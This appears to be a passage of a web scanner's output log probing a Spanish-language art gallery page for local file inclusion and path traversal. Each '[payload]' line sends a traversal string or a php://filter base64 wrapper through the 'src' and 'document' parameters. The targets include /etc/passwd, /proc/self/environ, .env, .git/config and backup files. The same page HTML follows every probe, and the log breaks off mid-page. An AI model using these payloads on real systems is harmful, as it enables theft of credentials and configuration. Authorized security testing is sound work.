            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] src=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: document
[payload] document=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] document=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
